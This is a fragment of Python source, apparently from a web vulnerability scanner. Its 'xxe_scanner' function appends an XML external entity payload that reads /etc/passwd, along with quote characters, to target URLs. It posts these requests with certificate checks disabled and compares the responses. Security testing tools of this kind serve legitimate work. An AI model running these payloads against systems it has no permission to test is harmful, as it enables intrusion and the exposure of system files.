...
def xxe_scanner(url, secure = True, bot = False):
    ...
    mal_script = ['<!DOCTYPE foo [ <!ENTITY silent SYSTEM "file:///etc/passwd" > ]>', "'", '"']
    my_list = []
    ...
    for i in my_result:
        for ii in mal_script:
            ...
            try:
                result = web_session.post(i + ii, verify = False, headers = user_agent, timeout = (5, 30)).status_code

                if int(result) == 200:
                    result_one = web_session.post(i, verify = False, headers = user_agent, timeout = (5, 30)).text
                    result_two = web_session.post(i + ii, verify = False, headers = user_agent, timeout = (5, 30)).text
